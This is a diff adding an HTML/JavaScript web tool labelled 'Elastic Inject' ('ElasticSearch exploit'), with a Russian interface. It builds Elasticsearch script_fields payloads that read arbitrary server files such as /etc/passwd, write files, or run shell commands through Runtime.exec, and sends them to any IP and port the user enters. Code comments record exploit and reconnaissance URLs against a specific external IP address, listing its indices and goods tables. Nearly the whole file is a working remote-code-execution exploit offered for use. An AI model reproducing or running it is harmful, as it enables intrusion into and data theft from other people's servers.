@@ -1,0 +1,202 @@
+<!doctype html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <!-- Latest compiled and minified CSS -->
+    <link href="http://netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Optional theme -->
+    <link href="http://netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap-theme.min.css" rel="stylesheet">
+</head>
+
+<script src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
+<script>
+    function elasticSearchInject() {
+        var mode = $('input[name="mode"]:checked').val();
+
+        var readFile = function (filename) {
+            return ("import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"" + filename + "\")).useDelimiter(\"\\\\Z\").next();");
+        };
+
+        var writeFile = function (filename) {
+            return ("import java.util.*;\nimport java.io.*;\nPrintWriter writer = new PrintWriter(new BufferedWriter(new FileWriter(\"" + filename + "\", true)));\nwriter.println(\"" + $("#write_content").val() + "\");\nwriter.close();");
+        };
+
+        var command = function(cmd) {
+            var query = "import java.util.*;\nimport java.io.*;\n p = Runtime.getRuntime().exec(new String[]{";
+            var array = cmd.split(' ');
+            for (var key in array) {
+                if (array.hasOwnProperty(key)) {
+                    var part = array[key];
+                    query += "\""+part+"\", ";
+                }
+            }
+            query += "});\n";
+            query += "InputStream stdin = p.getInputStream();\n";
+            query += "InputStreamReader isr = new InputStreamReader(stdin);\n";
+            query += "BufferedReader br = new BufferedReader(isr);\n";
+            query += "String result = \"\";\n";
+            query += "while ( (line = br.readLine()) != null) { result = result + line; };\n";
+            query += "return result;\n";
+
+            return query;
+        };
+
+        var query = {
+            "size": 1,
+            "query": {
+                "filtered": {
+                    "query": {
+                        "match_all": {}
+                    }
+                }
+            },
+            "script_fields": {}
+        };
+
+        switch (mode) {
+            case 'read':
+                var readFilename = $('#read_file').val();
+                query["script_fields"][readFilename] = {
+                    "script": readFile(readFilename)
+                };
+                break;
+            case 'write':
+                var writeFilename = $('#write_file').val();
+                query["script_fields"][writeFilename] = {
+                    "script": writeFile(writeFilename)
+                };
+                break;
+            case 'shell':
+                var commandText = $('#shell_command').val();
+                query["script_fields"]['command'] = {
+                    "script": command(commandText)
+                };
+                break;
+        }
+
+        var url = "http://" + $("#ip").val() + ":" + $("#port").val() + "/_search?source=" + (encodeURIComponent(JSON.stringify(query))) + "&callback=?";
+$('#script_results').html(encodeURIComponent(JSON.stringify({"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"/etc/passwd":{"script":"import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"/etc/passwd\")).useDelimiter(\"\\\\Z\").next();"}}})));
+// http://195.201.195.50:9200/_search?source={"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"/etc/passwd":{"script":"import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"/etc/passwd\")).useDelimiter(\"\\\\Z\").next();"}}}
+
+// curl -X PUT "localhost:9200/my-index-000001?pretty"  195.201.195.50
+
+
+
+//все индексы http://195.201.195.50:9200/_cat/indices?v
+//текущий индекс http://195.201.195.50:9200/_sql?source={%22query%22:%22%20SELECT%20count(*)%20FROM%20goods_69%22}&source_content_type=application/json&format=txt
+//поиск по текущему индексу http://195.201.195.50:9200/goods_15/_search
+        $.getJSON(url, function (data) {
+            var content, contents, hit, _j, _len1, _ref, _results;
+            _ref = data["hits"]["hits"];
+            _results = [];
+            for (_j = 0, _len1 = _ref.length; _j < _len1; _j++) {
+                hit = _ref[_j];
+                _results.push((function () {
+                    var _k, _len2, _ref1;
+                    _ref1 = hit["fields"];
+                    for (filename in _ref1) {
+                        if (_ref1.hasOwnProperty(filename)) {
+                            document.getElementById("script_results").innerHTML += ("<p>" + filename + "</p>");
+                            contents = _ref1[filename];
+                            if (contents) {
+                                for (_k = 0, _len2 = contents.length; _k < _len2; _k++) {
+                                    content = contents[_k];
+                                    document.getElementById("script_results").innerHTML += (content);
+                                }
+                                document.getElementById("script_results").innerHTML += ("<hr>");
+                            }
+                        }
+                    }
+                })());
+            }
+            return _results;
+        });
+    }
+    $(function () {
+        $('[data-buttons="mode"]').on('change', function () {
+            var mode = $(this).find(':checked').val();
+            $('[data-mode]').hide();
+            $('[data-mode="' + mode + '"]').show();
+        }).trigger('change');
+    });
+</script>
+<body>
+<div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="#">Elastic Inject</a>
+        </div>
+
+    </div>
+</div>
+<div class="container">
+    <div class="starter-template">
+        <h2>ElasticSearch эксплоит</h2>
+    </div>
+    <div class="col-md-8">
+        <div class="form" role="form">
+            <div class="form-group">
+                <div class="form-group">
+                    <label for="ip">IP</label>
+                    <input type="text" class="form-control" id="ip" value="127.0.0.1"/>
+                    <label for="port">Port</label>
+                    <input type="text" class="form-control" id="port" value="9200"/>
+                </div>
+            </div>
+            <div class="form-group">
+                <div class="btn-group" data-buttons="mode" data-toggle="buttons">
+                    <label class="btn btn-primary active" for="mode_read">
+                        <input checked name="mode" value="read" id="mode_read" type="radio"/> Прочитать из файла
+                    </label>
+                    <label class="btn btn-primary" for="mode_write">
+                        <input name="mode" value="write" id="mode_write" type="radio"/> Записать в файл
+                    </label>
+                    <label class="btn btn-primary" for="mode_shell">
+                        <input name="mode" value="shell" id="mode_shell" type="radio"/> Shell команда
+                    </label>
+                </div>
+            </div>
+            <div data-mode="read">
+                <div class="form-group">
+                    <div class="form-group">
+                        <label for="read_file">Файл для чтения</label>
+                        <input type="text" class="form-control" id="read_file" value="/etc/passwd"/>
+                    </div>
+                </div>
+            </div>
+            <div style="display: none" data-mode="write">
+                <div class="form-group">
+                    <label for="write_file">Файл для записи</label>
+                    <input type="text" class="form-control" id="write_file" value=""/>
+                </div>
+                <div class="form-group">
+                    <label for="write_content">Контент для записи</label>
+                    <textarea class="form-control" id="write_content" cols="30" rows="10"></textarea>
+                </div>
+            </div>
+            <div style="display: none" data-mode="shell">
+                <div class="form-group">
+                    <div class="form-group">
+                        <label for="shell_command">Команда</label>
+                        <input type="text" class="form-control" id="shell_command" value="uname -a"/>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <button onclick="elasticSearchInject();">Вперёд!</button>
+            </div>
+        </div>
+        <div id="script_results">
+            <h2 class="text-center">Результат</h2>
+        </div>
+    </div>
+</div>
+<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
+</body>
+</html>
